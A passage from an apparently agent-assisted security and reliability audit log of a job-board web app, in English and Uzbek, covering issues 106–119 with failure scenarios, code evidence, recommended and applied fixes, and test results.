req.user!.sub`, deleteMany on experience, education and skills, then createMany. - HEAD (pre-audit): the AuthContext interval did `if (fresh) { localStorage.setItem(...); setToken(fresh); }`. HEAD useProfileData load set status "loading" with dependency [token], and HEAD profile +Page.tsx:81 rendered HubSkeleton while loading. So the page reloaded as Y and never wrote stale X data. - Chat: apps/api/src/modules/chat/chat.routes.ts:153-156 closes the socket with 4401 when the token expires. - apps/web/src/lib/useChatSocket.ts:49,67-71 refreshes and then reconnects with getAccessToken(). - apps/web/src/lib/messages/useMessenger.ts:157 has `mine = message.senderId === userId`, with userId from context (X). - chat.routes.ts:181-183 has the participant check, which limits the chat effect to conversations Y is in.
- **Recommended fix:** In refreshSession (or in the interceptor before adopting a token), decode the `sub` claim from the new JWT payload and compare it with the sub of the token the session was established with. On mismatch, do not use the token for in-flight requests: force a full reload or call onSessionExpired. Also add a `storage` event listener on STORAGE_KEY so other tabs reload when the identity changes.
- **Bajarilgan fix:** `session.ts`: refresh boshqa foydalanuvchi (`sub`) tokenini qaytarsa token olinmaydi, so'rov takrorlanmaydi va sahifa qayta yuklanadi; `storage` hodisasi: boshqa tabda chiqish — mehmon holati, boshqa hisob — qayta yuklash; so'rov boshqa foydalanuvchi tokeniga almashtirilmaydi.
- **Test/dalil:** web typecheck/build PASS; reviewer agent real `session.ts` ni vaqtinchalik harness'da 29 ssenariy bilan sinadi (repo'da avtomatik test yo'q); brauzer P8 PASS (bir brauzerda B tabda boshqa hisobga kirilganda A tab qayta yuklandi, A tabdagi token ish beruvchi hisobiniki)

### ISSUE-107

**Maqola PUT eski muqovani boshqa maqolalarni tekshirmay o'chirardi: kontent muallifi chop etilgan maqola muqovasini o'chira olardi**

- **Severity:** P2
- **Verdict:** CONFIRMED (alohida verify agenti topilmani rad etishga urinib, tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** api-authz-security
- **Fayl:** `apps/api/src/modules/articles/articles.admin.routes.ts:400`
- **Agent sarlavhasi:** Article PUT deletes the old cover file without checking other articles, so a content author can delete a published article's cover
- **Failure scenario:** 1. content_author A edits their own draft and sets coverImageUrl to `/uploads/article-cover-<hex>.webp`, copied from an editor's published article. COVER_URL_RE (articles.content.ts:35) accepts any `/uploads/<name>`. 2. A saves again with coverImageUrl '' (which becomes null) or any other URL. 3. Line 400: `existing.coverImageUrl !== coverImageUrl` calls removeCoverFile, which unlinks the shared file. 4. The published article's cover now returns 404 on the public blog. The same happens by accident when an editor reuses one cover in two articles and later changes one of them. The lowest staff role can destroy editors' published assets.
- **Evidence:** apps/api/src/modules/articles/articles.admin.routes.ts - :400 `if (existing.coverImageUrl && existing.coverImageUrl !== coverImageUrl) removeCoverFile(existing.coverImageUrl);` has no sharing check. - :377 `coverImageUrl = body.coverImageUrl === undefined ? existing.coverImageUrl : body.coverImageUrl` - :195-198 removeCoverFile checks only the prefix, then `fs.promises.unlink(path.join(UPLOAD_DIR, path.basename(url)))`. - :440-443 DELETE counts shares first: `prisma.article.count({ where: { coverImageUrl: existing.coverImageUrl } })`. - :38 staffOnly includes content_author. :56 cover is validated only by COVER_URL_RE. apps/api/src/modules/articles/articles.content.ts - :35 `COVER_URL_RE = /^(\/uploads\/[A-Za-z0-9._-]+|https:\/\/[^\s"'<>]+)$/` accepts any upload name. apps/api/src/modules/articles/articles.permissions.ts - :49 `edit: editor || (owner && status === "draft")`, so an author can repeatedly edit their own draft. apps/api/src/modules/articles/articles.routes.ts - :24 and :159 return raw coverImageUrl for published articles publicly. apps/api/src/server.ts - :154 fastifyStatic serves UPLOAD_DIR at /uploads/, so an unlinked file returns 404. docs/audit/DECISIONS.md:141 (D-013) "Almashtirilgan/o'chirilgan fayl diskdan o'chiriladi" (replaced/deleted files are removed from disk). This deletion is audit-introduced; ISSUES.md:1065 records that old covers used to be left behind. Against the accidental variant: - apps/web/src/components/admin/articles/CoverField.tsx:33-47 and :72 only upload a new file (uploadArticleCover gives a random name) or call onChange(null). There is no URL input. - AdminArticleEditor.tsx:205 sends form.coverImageUrl unchanged. - demo-seed.ts:1883 demo covers are `uploads/demo-article-*`, which the prefix check skips. - No duplicate/clone feature exists (grep found nothing).
- **Recommended fix:** In PUT, unlink only when `prisma.article.count({ where: { coverImageUrl: existing.coverImageUrl, id: { not: existing.id } } }) === 0`, the same rule DELETE uses. Optionally stop authors from referencing another article's `/uploads/article-cover-*` file.
- **Bajarilgan fix:** Maqola PUT eski muqova faylini faqat boshqa maqola ishlatmasa o'chiradi (DELETE bilan bir xil qoida).
- **Test/dalil:** e2e 94/94 PASS (yakuniy build): `[PHASE6-V4]`

### ISSUE-108

**ISSUE-035 fix'i faqat /api/admin/* ni qamragan: roli olingan admin va bloklangan ish beruvchi 15 daqiqagacha huquqlarini saqlardi**

- **Severity:** P2
- **Verdict:** CONFIRMED (alohida verify agenti topilmani rad etishga urinib, tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** api-authz-security
- **Fayl:** `apps/api/src/modules/applications/applications.routes.ts:299`
- **Agent sarlavhasi:** ISSUE-035 fix only covers /api/admin/*: a demoted admin keeps admin bypasses and a blocked employer can keep messaging candidates for up to 15 minutes
- **Failure scenario:** (a) Admin X is demoted with PATCH /api/admin/users/X/role. The refresh token is revoked and /api/admin/* is refused (requireStaff), but X's access token still says role=admin for up to 15 minutes. During that window X can: - GET /api/candidates and receive every candidate's email and phone (candidates.routes.ts:33,86-87) - GET /api/vacancies/<any>/applications and receive applicants' email, phone and resumeUrl (line 242) - PATCH any application's status (line 311) - DELETE any review (reviews.routes.ts:89) - edit any vacancy (vacancies.routes.ts:102) - open a conversation with any seeker (chat.routes.ts:226) (b) Employer B is blocked for spam. The WebSocket is closed with 4403, but PATCH /api/applications/:id/status with the unchanged status plus a `reason` still succeeds: there is no requirePhoneVerified or isBlocked check, and line 319 only short-circuits when there is no reason. deliverMessage (lines 339-341) then sends WS and Telegram messages to every applicant, repeatedly, until the token expires.
- **Evidence:** - auth-guard.ts:25-30: requireRole compares only req.user.role from the JWT. Only requireStaff (38-45) and requirePhoneVerified (51-61) query the database for isBlocked or role. - jwt.ts:31: access token expiresIn "15m". - admin.routes.ts:25: `adminOnly = { preHandler: [requireAuth, requireStaff("admin")] }`. - admin.routes.ts:190-193 (block) and 215-216 (role): only revokeUserSessions and closeUserSockets. The comment claims the access token is checked against the database on write actions. - applications.routes.ts:299: `{ preHandler: [requireAuth, requireRole("employer", "admin")] }`, with no requirePhoneVerified. - applications.routes.ts:311 has the admin bypass. Line 319: `if (!changed && !reasonText) return current;`. Lines 339-341: `if (reasonText && req.user!.sub === ownerUserId) { getOrCreateConversation(...); deliverMessage(...) }`. - chat.routes.ts:26-51 (getOrCreateConversation) and 62-91 (deliverMessage): no block check; deliverMessage creates the message, calls sendToUser, and sends Telegram if the recipient is offline. - candidates.routes.ts:31 uses only requireRole. Line 33 sets isAdmin from the token; lines 86-87 add all users to contactable; lines 123-124 return email and phone. - applications.routes.ts:242 is the admin bypass that returns applicants' email, phone and resumeUrl. - vacancies.routes.ts:102 (ownedVacancy admin bypass); PUT, PATCH and DELETE at 171/226/272 use only requireRole; line 278 skips the applications-count guard for admins. - reviews.routes.ts:85-89 uses only requireAuth plus the token-role check. - server.ts:145: the only addHook in the API is onSend. - env.ts:33: RATE_LIMIT_MAX defaults to 600. - e2e-check.mjs:1322-1331 tests only /api/admin/overview for the demoted admin; lines 1471-1507 test only refresh and WebSocket for a blocked user. - ISSUES.md:891 and 902 state this 15-minute API impact, and ISSUE-035 is marked FIXED. No deferral of it appears in DECISIONS.md.
- **Recommended fix:** Confirm the admin role from the database wherever `role === 'admin'` grants cross-tenant access, via a shared helper that reuses the requireStaff lookup. Add a cheap not-blocked preHandler to write routes that lack requirePhoneVerified, at least PATCH /api/applications/:id/status and the vacancy PUT/PATCH/DELETE routes.
- **Bajarilgan fix:** `requireAuth` har so'rovda bazadan rol, blok va `tokenVersion` ni o'qiydi; access token `v` ni olib yuradi; bloklangan — 403 `USER_BLOCKED`, bekor qilingan seans — 401. Web 403 `USER_BLOCKED` da mehmon holatiga o'tadi; saqlangan kompaniyalar ro'yxati ham shu guard bilan (D-036).
- **Test/dalil:** e2e 94/94 PASS (yakuniy build): `[PHASE6-V5]` (2 ta), yangilangan jamoa tekshiruvi (eski token 401, qayta kirishda yangi rol)

### ISSUE-109

**Obuna sweep'i ishlayotgan paytda chop etilgan vakansiyalar uchun takroriy bildirishnoma yuborardi**

- **Severity:** P2
- **Verdict:** CONFIRMED (alohida verify agenti topilmani rad etishga urinib, tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** api-data-performance
- **Fayl:** `apps/api/src/modules/alerts/alerts.service.ts:173`
- **Agent sarlavhasi:** Alert sweep sends duplicate notifications for vacancies published while a sweep is running
- **Failure scenario:** ALERTS_INTERVAL_MINUTES=15 (env.ts:85). A sweep starts at 10:00:00, which becomes `now`. With about 10k subscriptions it runs for several minutes. Vacancy V is published at 10:02. Subscription S (lastNotifiedAt 09:45) is processed at 10:05: the claim sets lastNotifiedAt to 10:00:00, and listVacancies(publishedAfter 09:45, no upper bound) returns V, so S is notified. At the 10:15 sweep, since = 10:00:00 and newest.publishedAt (10:02) is later, so S is claimed again. listVacancies(publishedAfter 10:00) returns V a second time, and S gets a second in-app, Telegram, email and push notification for the same vacancy. D-018 and the header comment ('bitta obunaga ikki marta xabar ketmaydi') say this cannot happen.
- **Evidence:** apps/api/src/modules/alerts/alerts.service.ts: - 122: `const now = new Date();` (once per sweep) - 124-128: `newest` is read at sweep start - 168: `if (!newest?.publishedAt || newest.publishedAt <= since) continue;` - 171-174: `updateMany({ where: { id: search.id, lastNotifiedAt: since }, data: { lastNotifiedAt: now } })` - 178-179: `{ ...params, sort: "date", page: 1, pageSize: 20, publishedAfter: since }` followed by `await listVacancies(query)`, which runs when S's turn comes - 181-183: `fresh` only checks `v.publishedAt > since` apps/api/src/modules/vacancies/vacancies.service.ts: - 281: `publishedAfter` sends the query to MongoDB - 153: `...(query.publishedAfter ? { publishedAt: { gt: query.publishedAfter } } : {})`, with no upper bound - 316-324: `findMany` runs at call time - 523 and 547: new vacancies default to active with `publishedAt: new Date()` Other places that stamp `publishedAt` with the current time: - apps/api/src/modules/vacancies/vacancies.routes.ts:260: `publishedAt: new Date()` on activation - apps/api/src/modules/admin/admin.routes.ts:298: `publishedAt: vacancy.publishedAt ?? new Date()` apps/api/src/modules/notifications/notifications.service.ts: - 88-96: unconditional `prisma.notification.create` - 115-133: Telegram, push and email are fired with no dedup Other checks: - `git diff` of alerts.service.ts: the pre-audit code had the same pattern (`listVacancies` top 20 by date, then `update lastNotifiedAt: now` with sweep-start `now`), so the race predates the audit and was left in place. - Only alerts.service.ts:163/173 and alerts.routes.ts:97 (create) write `lastNotifiedAt`. PATCH does not reset it. - apps/api/scripts/e2e-check.mjs has no sweep test.
- **Recommended fix:** Take `const claimedAt = new Date()` right before each claim and store it as lastNotifiedAt. Bound the search with `publishedAt <= claimedAt`: add a `publishedBefore` to VacancyListQuery/buildFilters, or filter `fresh` by `v.publishedAt <= claimedAt`. Vacancies published later are picked up by the next sweep exactly once.
- **Bajarilgan fix:** Obuna sweep da'vo vaqti `claimedAt`; qidiruv oynasi `(since; claimedAt]` (`publishedBefore`), shuning uchun sweep paytida chop etilgan e'lon keyingi sweep'da bir marta yuboriladi.
- **Test/dalil:** API typecheck/build PASS; reviewer kodni tekshirdi. NOT TESTED: avtomatik sweep testi yo'q

### ISSUE-111

**2000 talik arizalar chegarasi web'da ko'rinmasdi: API `total`/`limit` tashlab yuborilib, sonlar kesilgan ro'yxatdan hisoblanardi**

- **Severity:** P2
- **Verdict:** CONFIRMED (alohida verify agenti topilmani rad etishga urinib, tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** api-data-performance
- **Fayl:** `apps/api/src/modules/applications/applications.routes.ts:219`
- **Agent sarlavhasi:** The 2000-application cap is invisible on the web: API `total`/`limit` are discarded, so counts come from the truncated list
- **Failure scenario:** An employer with 2,350 applications opens Murojaatlar. The API returns `{ items: <newest 2000>, total: 2350, limit: 2000 }`. The web keeps only `items`, so the 'Barchasi' tab shows 2000 and the per-status counts cover only the newest 2000. The oldest 350 applications cannot be reached, and nothing tells the user the list was cut. D-018 says 'sonlar to'g'ri' (counts are correct), but no count shown in the UI uses `total`.
- **Evidence:** - **API:** `apps/api/src/modules/applications/applications.routes.ts:30` has `const EMPLOYER_LIST_LIMIT = 2000;`. Line 219 has `take: EMPLOYER_LIST_LIMIT`, and line 223 has `return { items, total, limit: EMPLOYER_LIST_LIMIT };`. The pre-audit version (`git show HEAD`) had no `take` and returned `{ items }`. - **Web fetcher:** `apps/web/src/lib/employer/applications/api.ts:17-19` reads only `json.items`: `if (!res.ok || !json || !Array.isArray(json.items)) throw ...; return json.items.map(mapEmployerApplication)...`. - **Web view:** `apps/web/src/components/employer/applications/EmployerApplicationsView.tsx:108` has `statusCounts(withoutStatus)` and line 278 has `total={filtered.length}`. `adapter.ts:224` has `all: items.length`. No `total` or `limit` is used anywhere in the web applications module, and there is no truncation notice. - **Uncapped counts elsewhere:** `apps/api/src/modules/chat/chat.routes.ts:601-603` counts `status: "sent"` across all owned vacancies for the header badge. `adapter.ts:170` sets `applicationCount` from `vacancy._count.applications` (uncapped). `apps/web/src/components/employer/vacancies/VacancyRow.tsx:50` deep-links `?vacancy=id`, but filtering runs on the truncated list (`adapter.ts:207`). - **Decision doc:** `docs/audit/DECISIONS.md:202` says "Chegaradan oshgan eng eski yozuvlar ro'yxatda ko'rinmaydi (sonlar to'g'ri)" ("the oldest records past the cap don't appear in the list (counts are correct)"). The UI counts are not correct past the cap. - **E2E:** `apps/api/scripts/e2e-check.mjs:328-364` only inspects `.body.items` from this endpoint. - **Dead code:** `apps/web/src/lib/api.ts:863` `fetchEmployerApplications` has no callers, so it is not relevant.
- **Recommended fix:** Return `{ items, total, limit }` from fetchEmployerApplicationList. Show a 'showing newest N of total' notice when total > limit, and base the 'all' count on `total`. Longer term, move status filtering and pagination to the server.
- **Birlashtirilgan takror:** [P3] `apps/web/src/lib/employer/applications/api.ts:19` — Employer applications total/limit is dropped, so status counts are silently wrong above 2000
- **Bajarilgan fix:** Web `fetchEmployerApplicationList` `{ items, total, limit }` qaytaradi; ro'yxat server chegarasida kesilgan bo'lsa holat tablari ustida uch tilda ogohlantirish.
- **Test/dalil:** web typecheck/build PASS; brauzer P4 PASS (javobda total > items bo'lganda "Eng yangi 12 ta murojaat ko'rsatilmoqda (jami 2 512 ta)" ogohlantirishi)

### ISSUE-112

**Ommaviy xabar Telegram va SMTP'ni tezlik cheklovisiz to'ldirardi; tashqi yuborishlarning ko'pi jimgina yo'qolardi**

- **Severity:** P2
- **Verdict:** CONFIRMED (alohida verify agenti topilmani rad etishga urinib, tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** api-data-performance
- **Fayl:** `apps/api/src/modules/notifications/notifications.service.ts:116`
- **Agent sarlavhasi:** Background broadcast floods Telegram and SMTP without throttling; most external deliveries are dropped silently
- **Failure scenario:** An admin broadcasts to role=all with 10k users. The loop at admin.routes.ts:559-561 awaits notify(), which only awaits the preference query and in-app insert (a few ms). Telegram, push and email are started with `void`, so outbound calls go out at roughly 100-300 per second. Telegram's bot limit is about 30 msg/s, so most sendMessage calls get `ok:false` (429); tg() logs a warning and returns null with no retry. The nodemailer transport has no `pool`, so each email opens its own SMTP connection and the provider throttles or refuses them. The admin receives `202 { sent: 10000 }`, but most users never get the Telegram or email copy. Batching 500 users at a time (ISSUE-054) only paces the database reads, not channel delivery.
- **Evidence:** - apps/api/src/modules/admin/admin.routes.ts:559-560: `for (const user of batch) { await notify({ userId: user.id, type: "system", title, body, url: target }); ...` passes no `channels`, so ALL_CHANNELS apply (notifications.service.ts:42). Line 573 returns `reply.status(202).send({ sent: total })`. - apps/api/src/modules/notifications/notifications.service.ts:77 and 88 are the only awaited steps (prefs findMany, notification.create). The channels are fire-and-forget: 116 `void notifyUserViaTelegram(...).catch(ignore)`, 124 `void sendPushToUser(...).catch(ignore)`, 134 `void sendUserEmail(input, absoluteUrl).catch(ignore)`. - apps/api/src/modules/telegram/telegram.service.ts:32-34: `if (!json.ok) { logger.warn(...); return null; }`. There is no 429 or retry_after handling. Lines 164-171: notifyUserViaTelegram does a lookup, then sendTelegramMessage. - apps/api/src/modules/telegram/telegram.service.ts:309: `data: { phone, isPhoneVerified: true }` is the only place phone verification is set. auth-guard.ts:51-68 requires it for apply, conversations/start, vacancy create and reviews, so most active users have Telegram linked. - apps/api/src/common/mailer.ts:17: `nodemailer.createTransport({ host, port, secure, ...auth })` has no `pool`, `maxConnections` or `rateLimit`. sendMail catches errors, logs `[mail] yuborilmadi` and returns false. - docs/audit/ISSUES.md:1312 names this impact and 1314 recommends in_app-only or a ~20/s queue plus `pool: true, maxConnections: 5`. The applied fix at 1317 covers only 202, batches, the lock and `//host`, and the status is FIXED. DECISIONS.md:230 (D-021) mentions ISSUE-054 only for url; no entry defers throttling. - git diff HEAD for notifications.service.ts shows the void channel calls predate the audit; only `.catch(ignore)` was added. This is a problem left in place, not a regression. - apps/web/src/lib/i18n/messages.en.ts:1832: `broadcastSent: (n) => \`Sending to ${n} users\`` gives the admin no view of failed deliveries.
- **Recommended fix:** For bulk sends, await the channel promises or run them through a small rate-limited queue (Telegram at 25/s or less, honoring `retry_after`). Enable nodemailer `pool: true` with `maxConnections` and `rateLimit`. Alternatively, restrict broadcasts to in-app plus throttled push.
- **Bajarilgan fix:** Ommaviy xabar tashqi kanallarni kutadi (har foydalanuvchi uchun ko'pi bilan 20 s), foydalanuvchilar orasida kamida 40 ms; Telegram 429 `retry_after` ≤ 30 s bo'lsa kutib bir marta qayta urinadi; Telegram so'roviga 15 s timeout.
- **Test/dalil:** API typecheck/build PASS; e2e 94/94 PASS (yakuniy build): `[ISSUE-054]`, `[PHASE6-U13]`. NOT TESTED: tezlik cheklovi va 429 yo'li (Telegram test muhitida o'chiq)

### ISSUE-113

**Refresh route vaqtinchalik baza xatosini "seans yo'q" deb cookie'ni tozalardi va klient foydalanuvchini chiqarib yuborardi**

- **Severity:** P2
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** web-session-realtime
- **Fayl:** `apps/api/src/modules/auth/auth.routes.ts:85`
- **Agent sarlavhasi:** Refresh route turns transient DB errors into 'no session' and clears the cookie, so the new client logic logs the user out
- **Failure scenario:** MongoDB has a few seconds of failover or a Prisma pool timeout. A user's 15-minute access token expires in that window, and the 20s inbox poll gets a 401. The interceptor calls refreshSession. The server's prisma.user.findUnique throws. The catch-all at auth.routes.ts:85 clears the refresh cookie and returns 200 {accessToken:null}. requestRefresh returns null (session.ts:62), the interceptor calls onSessionExpired, and becomeGuest removes the localStorage token. The user is permanently logged out and has to type the password again. useRequireRole then redirects protected pages to /login, and unsaved drafts are lost. D-023 says 'Tarmoq/server xatosi seansni o'chirmaydi', but the client can only honour that when the server returns 5xx, which this route never does. Before the audit, the interval ignored null, so the in-memory token survived until it expired.
- **Evidence:** auth.routes.ts:81-89: `try { const tokens = await refreshSession(refreshToken); ... } catch { clearRefreshCookie(reply); return reply.send({ accessToken: null }); }`. auth.service.ts:137 `await prisma.user.findUnique(...)` is inside that try. session.ts:60-62 treats 200 with a null token as a confirmed missing session. session.ts:112-114 `if (fresh === null) { onSessionExpired?.(); ...}`. AuthContext.tsx:124 `else if (fresh === null) becomeGuest();`.
- **Recommended fix:** In the refresh route catch, return null and clear the cookie only for AppError 401/403 (invalid token, version mismatch, blocked). Rethrow everything else so the error handler returns 5xx; the client already maps 5xx to `undefined`, which keeps the session.
- **Bajarilgan fix:** Refresh cookie faqat 401/403 autentifikatsiya xatolarida tozalanadi; boshqa xato 5xx bo'ladi va klient seansni saqlaydi.
- **Test/dalil:** API typecheck/build PASS; reviewer kodni tekshirdi. NOT TESTED: baza nosozligi e2e'da simulyatsiya qilinmadi

### ISSUE-114

**WS tayyorlik tekshiruvidagi vaqtinchalik baza xatosi 4403 bilan yopardi, klient buni doimiy deb real-time'ni o'chiq qoldirardi**

- **Severity:** P2
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** web-session-realtime
- **Fayl:** `apps/api/src/modules/chat/chat.routes.ts:147`
- **Agent sarlavhasi:** A transient DB error during the WS readiness check closes the socket with 4403, and the client treats 4403 as permanent, so realtime chat stays dead
- **Failure scenario:** After an API redeploy, every open tab reconnects about 1s later, causing a burst of user.findUnique calls. One of them fails (pool timeout P2024 or replica election), `.catch(() => false)` resolves `ready` to false, and the server sends ws.close(4403). In useChatSocket (line 66) and useNotifications (line 119), 4403 returns without scheduling a reconnect. On /messages, `connected` stays false and every send is immediately marked 'Yuborilmadi' (useMessenger.dispatch: socket.send returns false; there is no REST fallback). Realtime notifications also stop. Nothing recovers until the user reloads the page, and the user stays 'authed' the whole time.
- **Evidence:** chat.routes.ts:144-150: `.then((u) => Boolean(u && !u.isBlocked)).catch(() => false); void ready.then((ok) => { if (!ok) ws.close(4403, "forbidden"); });`. useChatSocket.ts:66 `if (event.code === CLOSE_FORBIDDEN) return;`. useNotifications.ts:119 `if (event.code === 4403) return;`. useMessenger.ts:230-232 marks the message failed when send() returns false.
- **Recommended fix:** Server: use 4403 only when the user is confirmed blocked or missing. On a lookup error, close with a retryable code such as 1011 or 1013, which the client already reconnects on with backoff. Client: on 4403, call refreshSession() once; if it returns null, move to guest, and if it returns a token, retry with backoff instead of stopping forever.
- **Birlashtirilgan takror:** [P3] `apps/api/src/modules/chat/chat.routes.ts:147` — A temporary DB error during the WebSocket block check closes with 4403, which both web clients treat as permanent
- **Bajarilgan fix:** WS tayyorlik tekshiruvi: baza xatosi 1011 (qayta ulanadi), bloklangan yoki yo'q foydalanuvchi 4403, eskirgan token versiyasi 4401. Klientda hisoblagichlar faqat kamida 10 s barqaror ulanishdan keyin tiklanadi, shuning uchun 4401 chegarasi va 1011 backoff haqiqatda ishlaydi.
- **Test/dalil:** API va web typecheck/build PASS; e2e 94/94 PASS (yakuniy build): WebSocket tekshiruvlari; reviewer agent hook'larni harness'da sinadi. NOT TESTED: 1011 yo'li avtomatik testda

### ISSUE-115

**TelegramConnect: bitta muvaffaqiyatsiz holat so'rovi sahifa yangilanguncha telefon tasdig'ini bloklardi**

- **Severity:** P2
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** web-ui-states-i18n
- **Fayl:** `apps/web/src/components/TelegramConnect.tsx:176`
- **Agent sarlavhasi:** TelegramConnect: one failed status request blocks phone verification until the page is reloaded
- **Failure scenario:** A job seeker opens /profile while GET /api/telegram/status fails once (network error or 5xx). `fetchTelegramStatus` now throws, so `status` stays null. Compact card on the dashboard (ProfileOverview): the status rows stay skeletons forever (line 116), no error text is rendered, and the 'open' link is hidden because it requires `status` (line 117). Card and panel variants: the error text appears, but Connect is `disabled={!status}` (line 176) and the Refresh button only exists when `showHint` is true (line 180). The only way out is a full page reload. Phone verification is required to apply, post and review, so the user is stuck.
- **Evidence:** lib/api.ts fetchTelegramStatus now throws on !res / !res.ok; before the audit it returned {linked:false, phoneVerified:false}. TelegramConnect.tsx: the catch at line 52 sets only `error`; line 117 `{!allDone && status && openHref && ...}`; line 176 `disabled={!status}`; line 180 refresh is gated by `showHint`, which becomes true only after connect(). The compact branch (lines 104-134) never renders `error`.
- **Recommended fix:** On error, show a retry button in every variant (including compact) that calls refresh(). Do not disable Connect just because the status is unknown: requestTelegramLink does not depend on it. Also replace the skeleton rows with the error text when `error && !status`.
- **Bajarilgan fix:** TelegramConnect: holat so'rovi xato bo'lsa barcha variantlarda xato matni va qayta urinish tugmasi; Connect tugmasi o'chirilmaydi; tarmoq xatosida lokal matn.
- **Test/dalil:** web typecheck/build PASS; brauzer P2 PASS (nomzod va ish beruvchi profilida xato matni va "Yangilash"; ish beruvchida Connect yoqilgan)

### ISSUE-116

**Telefoni tasdiqlanmagan ish beruvchi vakansiyani qayta faollashtirganda telefon eslatmasi o'rniga umumiy xato ko'rardi**

- **Severity:** P2
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** web-ui-states-i18n
- **Fayl:** `apps/web/src/lib/employer/vacancies/api.ts:59`
- **Agent sarlavhasi:** Re-activating a vacancy without a verified phone shows a generic error, not the phone-gate notice
- **Failure scenario:** An employer whose phone is not verified (for example a legacy account) clicks 'Activate' on an archived or draft vacancy. The API now runs requirePhoneVerified on archived/draft -> active (D-015, ISSUE-087) and returns 403 {error:'PHONE_NOT_VERIFIED'}. vacancyActionErrorKind maps only VACANCY_HAS_APPLICATIONS, 409 and 400 VALIDATION_ERROR, so this falls to 'generic' and the user sees 'Amalni bajarib bo'lmadi. Qayta urinib ko'ring.' No PhoneGateNotice appears, and retrying fails the same way.
- **Evidence:** apps/api/src/modules/vacancies/vacancies.routes.ts:248 `if (!isAdmin) await requirePhoneVerified(req, reply);` -> auth-guard.ts:63 AppError(403,'PHONE_NOT_VERIFIED'). vacancyActionErrorKind (api.ts:59-67) has no PHONE_NOT_VERIFIED branch. EmployerVacanciesView.tsx:107-113 errorText -> p.errors.generic. VacancyForm/FormSidebar already handle isPhoneGateError, but the list view does not.
- **Recommended fix:** Add a 'phoneGate' kind (use isPhoneGateError) and render <PhoneGateNotice/> or a notice that links to the Telegram section in EmployerVacanciesView.
- **Bajarilgan fix:** Qayta e'lon qilishda 403 `PHONE_NOT_VERIFIED` — aniq matn va telefonni tasdiqlash havolasi (`PhoneGateNotice`).
- **Test/dalil:** web typecheck/build PASS; e2e 94/94 PASS (yakuniy build): `[PHASE6-U31]` (server 403 `PHONE_NOT_VERIFIED`)

### ISSUE-117

**Kompaniyasiz ish beruvchiga nomzodlar sahifasi "internetni tekshiring" derdi va qayta urinish hech qachon ishlamasdi**

- **Severity:** P2
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** web-ui-states-i18n
- **Fayl:** `apps/web/src/pages/employer/candidates/+Page.tsx:131`
- **Agent sarlavhasi:** Candidates page tells an employer without a company to check their internet, and Retry can never work
- **Failure scenario:** A newly registered employer with no company profile opens /employer/candidates. This is the header nav link, and the header's home link for employers also points here (Header.tsx:76). The API returns 400 BAD_REQUEST 'Avval kompaniya profilini to'ldiring'. fetchCandidates now throws, and the page renders the generic ErrorState: 'Ma'lumotlarni yuklab bo'lmadi / Internet aloqasini tekshirib, qayta urinib ko'ring'. Every Retry gets the same 400, and nothing tells the employer to create a company.
- **Evidence:** apps/api/src/modules/candidates/candidates.routes.ts:34-36 throws Errors.badRequest when there is no primaryCompany. The web page's error branch (line 131) does not look at err.status or err.code. The employer vacancies and vacancy form views already have NeedCompanyState for this case.
- **Recommended fix:** Keep the ApiError in state. For status 400 with code BAD_REQUEST on this endpoint, or after checking /api/employer/company first, render NeedCompanyState (link to /profile) instead of ErrorState. Better still, have the API return a dedicated code such as COMPANY_REQUIRED.
- **Bajarilgan fix:** API 400 `COMPANY_REQUIRED`; nomzodlar sahifasi kompaniya profilini to'ldirish holatini va profil havolasini ko'rsatadi.
- **Test/dalil:** e2e 94/94 PASS (yakuniy build): `[PHASE6-U5]`; web typecheck/build PASS; brauzer P3 PASS (COMPANY_REQUIRED javobida kompaniya holati va `/profile` havolasi)

### ISSUE-118

**Qo'ng'iroq menyusi API xatosida hali ham "Bildirishnomalar yo'q" ko'rsatardi**

- **Severity:** P2
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** web-ui-states-i18n
- **Fayl:** `apps/web/src/components/NotificationBell.tsx:62`
- **Agent sarlavhasi:** Notification bell dropdown still shows 'No notifications' when the API fails
- **Failure scenario:** A signed-in user loads a page while GET /api/notifications fails. useNotifications (made strict for ISSUE-067) sets failed=true and keeps items=[]. The bell destructures only items/unreadCount (line 18) and renders `items.length === 0 ? t.notifications.empty`. The user sees 'no notifications' although they may have unread ones, which breaks the rule that API errors are never shown as empty states.
- **Evidence:** useNotifications.ts:46 sets `failed`, and the hook returns it at line 173. NotificationBell.tsx:18 does not read `failed` or `loading`; line 62 falls through to the empty text.
- **Recommended fix:** Read `failed` and `loading` from the hook. While loading, show a skeleton. When `failed && items.length === 0`, show an error line with a retry that calls refresh() instead of t.notifications.empty.
- **Birlashtirilgan takror:** [P3] `apps/web/src/components/NotificationBell.tsx:62` — The notification bell ignores the new `failed` flag, so a load error shows as 'no notifications'
- **Bajarilgan fix:** Qo'ng'iroq: yuklanmoqda holati, xato matni va qayta urinish tugmasi ("bildirishnoma yo'q" o'rniga).
- **Test/dalil:** web typecheck/build PASS; brauzer P1 PASS (xato matni, "Qayta urinish" yangi so'rov yubordi, "Bildirishnomalar yo'q" ko'rinmadi)

### ISSUE-119

**`.env.example` dagi JWT namuna qiymatlari ISSUE-009 uchun qo'shilgan production tekshiruvidan o'tardi**

- **Severity:** P2
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** tests-docs-consistency
- **Fayl:** `apps/api/.env.example:19`
- **Agent sarlavhasi:** .env.example JWT placeholders now pass the production secret guard added for ISSUE-009
